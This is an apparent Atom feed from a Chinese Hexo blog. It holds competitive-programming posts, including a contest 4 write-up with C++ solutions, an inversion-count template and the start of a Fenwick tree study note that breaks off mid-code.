<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233&#39;s blog</title>
  
  <subtitle>学习应该像呼吸一样自然</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-07-30T13:10:40.127Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>“蔚来杯”2022牛客暑期多校训练营4题解</title>
    <link href="http://example.com/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/</id>
    <published>2022-07-30T10:00:00.000Z</published>
    <updated>2022-07-30T13:10:40.127Z</updated>
    
    <content type="html"><![CDATA[<p>这把依然和 sigma 姐姐打这场多校。出了4题rank300多也还可以的，该罚坐的题还是罚坐，该做的也都做了。</p><span id="more"></span><h2 id="E-Jobs-Hard-Version"><a href="#E-Jobs-Hard-Version" class="headerlink" title="E. Jobs (Hard Version)"></a>E. Jobs (Hard Version)</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题就是说，有 $n$ 家公司，然后主人公有 $q$ 个朋友，每个公司有一定的职位，如果你至少符合一个公司的 $3Q(IQ,EQ,AQ)$ 要求，那么这家公司就会给你发 offer，然后问你这些朋友分别能拿多少 offer。这题防止读入量太大给你一个随机生成器去产生数据，最后还要求强制在线。</p><p>因为 3Q 的范围都比较小，然后当然我们就可以存一个最低的要求，因为我只用符合一个职位就可以了，我们最开始的想法是：开个数组：$dp[i][j][k][b]$ 表示第 $i$ 家公司 $IQ=j,EQ=k,AQ=b$ 能拿到多少职位。那么我们读入公司的职位要求然后先给当前点都 $+1$然后前缀以下，查询的时候只需要把相应的公司，3Q 输入下标查询是否为 0 即可，为 0 就说明没有 offer 嘛。</p><p>但是一算数据量发现编译器就阻拦住了，因此换一种思路，因为我们不需要知道一个人在一个公司能拿多少 offer 我们只关心拿没拿 offer，因此我们可以降维度去做。 $dp[i][j][k]$ 表示第 $i$ 家公司，$IQ=j,EQ=k$ 的情况下，能至少拿一个职位需要的最低 $AQ$。那么查询的时候我们只需要把 $i\ j\ k$ 给下标取出最低要求判断我的 $AQ$ 是否大于等于即可。然后就是抄随即发生器，在 $seed^{q-i}$ 可以写快速幂去算，最重要的一点：一定不要溢出，可以的话都开 long long 一定没事，或者为了提醒自己，时刻加上 <code>assert(v&gt;=0)</code> 至少提交的时候虽然浪费 20 罚时，但是你看到运行错误你就知道是溢出了，而不是一脸懵逼不知道哪里出错了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;random&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MOD 998244353</span></span><br><span class="line"><span class="keyword">int</span> seed;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">10</span>][<span class="number">401</span>][<span class="number">401</span>];</span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int</span> base,<span class="keyword">int</span> exp)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">long</span> <span class="keyword">long</span> k=base;exp;exp&gt;&gt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(exp&amp;<span class="number">1</span>)&#123;</span><br><span class="line">            ans=(ans*k)%MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        k=k*k%MOD;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dp));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> num,IQ,EQ,AQ;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=num;j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;IQ,&amp;EQ,&amp;AQ);</span><br><span class="line">            dp[i][IQ][EQ]=<span class="built_in">min</span>(dp[i][IQ][EQ],AQ);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">400</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=<span class="number">400</span>;k++)&#123;</span><br><span class="line">                dp[i][j][k]=<span class="built_in">min</span>(dp[i][j][k],<span class="built_in">min</span>(dp[i][j][k<span class="number">-1</span>],dp[i][j<span class="number">-1</span>][k]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;seed);</span><br><span class="line">    <span class="function">std::mt19937 <span class="title">rng</span><span class="params">(seed)</span></span>;</span><br><span class="line">    std::uniform_int_distribution&lt;&gt;<span class="built_in">u</span>(<span class="number">1</span>,<span class="number">400</span>);</span><br><span class="line">    <span class="keyword">int</span> lastans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> qans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="keyword">int</span> IQ=(<span class="built_in">u</span>(rng)^lastans)%<span class="number">400</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> EQ=(<span class="built_in">u</span>(rng)^lastans)%<span class="number">400</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> AQ=(<span class="built_in">u</span>(rng)^lastans)%<span class="number">400</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d %d\n&quot;,IQ,EQ,AQ);</span></span><br><span class="line">        <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(dp[i][IQ][EQ]&lt;=AQ)&#123;</span><br><span class="line">                ans++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        lastans=ans;</span><br><span class="line">        qans+=lastans*<span class="built_in">qpow</span>(seed,m);</span><br><span class="line">        <span class="built_in">assert</span>(qans&gt;=<span class="number">0</span>);</span><br><span class="line">        qans%=MOD;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,qans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="comment">//printf(&quot;%d&quot;,qpow(2,591));</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="H-Wall-Builder-II"><a href="#H-Wall-Builder-II" class="headerlink" title="H. Wall Builder II"></a>H. Wall Builder II</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题的话是赛时我和 sigma 都写出来了的题目。自己还交错几发亏了点罚时，因为没看到说一定要矩形，以为可以任意形状的。就是说给你高度为1的砖头，长度为 1 的有 $n$ 块，长度为 $2$ 的有 $n-1$ 块……长度为 $n$ 的有一块。</p><p>容易发现不管怎么放面积十肯定不会变的，那么就变成了我们以前聊到的话题：面积相同的情况下周长怎么最短。那就是长宽接近的时候，因为这题面积不大，所以我们直接 $sqrt$ 往后寻找最大的较小因数作为高度，然后面积/高得到宽度。因为砖头块高为 1，所以我们每一行每一行考虑，不难发现我们先放大的，最后放小的一定能放下。根据这个贪心策略我们就可以很容易写出这题，因为要按顺序输出方案，最后再把方案总结起来然后排个序输出即可。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 1005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];<span class="comment">//,b[maxn];</span></span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="keyword">int</span> dp[maxn],sum1[maxn],sum2[maxn];</span><br><span class="line"><span class="keyword">int</span> num[maxn];</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt;q[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> line,<span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(length==<span class="number">0</span>)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="built_in">min</span>(length,n);i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(num[i])&#123;</span><br><span class="line">            q[line].<span class="built_in">push</span>(i);</span><br><span class="line">            num[i]--;</span><br><span class="line">            <span class="built_in">push</span>(line,length-i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pu</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x,y,x1,y1;</span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span> &lt;(<span class="keyword">const</span> pu&amp;a)&#123;</span><br><span class="line">        <span class="keyword">return</span> (x1-x)&lt;(a.x1-a.x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;b[<span class="number">200005</span>]; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=(n+<span class="number">1</span>-i)*i;</span><br><span class="line">        num[i]=n+<span class="number">1</span>-i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> k=(<span class="keyword">int</span>)<span class="built_in">sqrt</span>(ans);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> width=<span class="number">0</span>,height=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=k;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ans%i==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>,i,ans/i);</span><br><span class="line">            height=i;</span><br><span class="line">            width=ans/i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,width*<span class="number">2</span>+height*<span class="number">2</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=height;i++)&#123;</span><br><span class="line">        <span class="comment">//printf(&quot;%d %d\n&quot;,i,height);</span></span><br><span class="line">        <span class="built_in">push</span>(i,width);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=height;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> start=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(q[i].<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">int</span> len=q[i].<span class="built_in">front</span>();</span><br><span class="line">            q[i].<span class="built_in">pop</span>();</span><br><span class="line">        <span class="comment">//    printf(&quot;%d %d %d %d\n&quot;,);</span></span><br><span class="line">            b[++cnt]=&#123;start,i<span class="number">-1</span>,start+len,i&#125;;</span><br><span class="line">            start+=len;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(b+<span class="number">1</span>,b+<span class="number">1</span>+cnt);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=cnt;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d\n&quot;</span>,b[i].x,b[i].y,b[i].x1,b[i].y1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="K-NIO’s-Sword"><a href="#K-NIO’s-Sword" class="headerlink" title="K. NIO’s Sword"></a>K. NIO’s Sword</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>waiting for sigma</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><p>waiting for sigma</p><h2 id="N-Particle-Arts"><a href="#N-Particle-Arts" class="headerlink" title="N. Particle Arts"></a>N. Particle Arts</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/07/30/%E2%80%9C%E8%94%9A%E6%9D%A5%E6%9D%AF%E2%80%9D2022%E7%89%9B%E5%AE%A2%E6%9A%91%E6%9C%9F%E5%A4%9A%E6%A0%A1%E8%AE%AD%E7%BB%83%E8%90%A54%E9%A2%98%E8%A7%A3/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>waiting for sigma</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><p>waiting for sigma</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>冲冲冲吧，今天还算不错的！</p><!--希望和sigma一起进步，越变越好-->]]></content>
    
    
    <summary type="html">&lt;p&gt;这把依然和 sigma 姐姐打这场多校。出了4题rank300多也还可以的，该罚坐的题还是罚坐，该做的也都做了。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="多校，牛客" scheme="http://example.com/categories/icpc/%E5%A4%9A%E6%A0%A1%EF%BC%8C%E7%89%9B%E5%AE%A2/"/>
    
    
  </entry>
  
  <entry>
    <title>逆序对板子</title>
    <link href="http://example.com/2022/07/29/%E9%80%86%E5%BA%8F%E5%AF%B9/"/>
    <id>http://example.com/2022/07/29/%E9%80%86%E5%BA%8F%E5%AF%B9/</id>
    <published>2022-07-28T20:00:00.000Z</published>
    <updated>2022-07-28T21:05:23.368Z</updated>
    
    <content type="html"><![CDATA[<p>来源于CF1676H2题目，遇到一个求逆序对的问题，咱也不敢问为什么能这么求啊。</p><span id="more"></span><h2 id="求逆序对"><a href="#求逆序对" class="headerlink" title="求逆序对"></a>求逆序对</h2><p>用途：给一个序列，求出逆序对，$O(log_2n)$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t; cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> n,rez=<span class="number">0</span>;</span><br><span class="line">        cin&gt;&gt;n;</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(n)</span>,<span class="title">T</span><span class="params">(n+<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) cin&gt;&gt;a[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> x=a[i];x&gt;<span class="number">0</span>;x -= x&amp;-x) rez+=T[x];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> x=a[i];x&lt;=n;x+=x&amp;-x) T[x]+=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;rez&lt;&lt;<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;来源于CF1676H2题目，遇到一个求逆序对的问题，咱也不敢问为什么能这么求啊。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="板子" scheme="http://example.com/categories/icpc/%E6%9D%BF%E5%AD%90/"/>
    
    <category term="逆序对" scheme="http://example.com/categories/icpc/%E6%9D%BF%E5%AD%90/%E9%80%86%E5%BA%8F%E5%AF%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>树状数组学习笔记</title>
    <link href="http://example.com/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://example.com/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-07-28T19:00:00.000Z</published>
    <updated>2022-07-28T20:26:24.970Z</updated>
    
    <content type="html"><![CDATA[<p>树状数组（Fenwick Tree），这次EC Final遇到过的，英文也记一下，也来学一下，刚好半夜刷题刷到了树状数组可以解决的题目！</p><span id="more"></span><!--sigma--><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>树状数组和线段树具有相似的功能，但他俩毕竟还有一些区别：树状数组能有的操作，线段树一定有；线段树有的操作，树状数组不一定有。但是树状数组的代码要比线段树短，思维更清晰，速度也更快，在解决一些单点修改的问题时，树状数组是不二之选。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>下面这张图展示了树状数组的工作原理：</p><p><img src="/2022/07/29/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1.svg" alt="1"></p><p>这个结构和线段树有些类似：用一个大节点表示一些小节点的信息，进行查询的时候只需要查询一些大节点而不是所有的小节点。</p><p>最上面的八个方块就代表数组 $a$。</p><p>他们下面的参差不齐的剩下的方块就代表数组 $a$ 的上级——$c$ 数组。</p><p>从图中可以看出：<br>$c_2$ 管理的是 $a_1$,$a_2$；<br>$c_4$ 管理的是 $a_1$,$a_2$,$a_3$,$a_4$；<br>$c_6$ 管理的是 $a_5$,$a_6$；$c_8$ 则管理全部 $8$ 个数。</p><p>如果要计算数组 $a$ 的区间和，比如说要算 $a_{51}$~$a_{91}$ 的区间和，可以采用类似倍增的思想：</p><p>从 $91$ 开始往前跳，发现 $c_n$（$n$ 我也不确定是多少，算起来太麻烦，就意思一下）只管 $a_{91}$ 这个点，那么你就会找 $a_{90}$，发现 $c_{n - 1}$ 管的是 $a_{90}$&amp;$a_{89}$；那么你就会直接跳到 $a_{88}$，$c_{n - 2}$ 就会管 $a_{81}$~$a_{88}$ 这些数，下次查询从 $a_{80}$ 往前找，以此类推。</p><h2 id="用法及操作"><a href="#用法及操作" class="headerlink" title="用法及操作"></a>用法及操作</h2><p>那么问题来了，怎么知道 $c_i$ 管理的数组 $a$ 中的哪个区间呢？<br>这时，我们引入一个函数——<code>lowbit</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// C++ Version</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// x 的二进制表示中，最低位的 1 的位置。</span></span><br><span class="line">  <span class="comment">// lowbit(0b10110000) == 0b00010000</span></span><br><span class="line">  <span class="comment">//          ~~~^~~~~</span></span><br><span class="line">  <span class="comment">// lowbit(0b11100100) == 0b00000100</span></span><br><span class="line">  <span class="comment">//          ~~~~~^~~</span></span><br><span class="line">  <span class="keyword">return</span> x &amp; 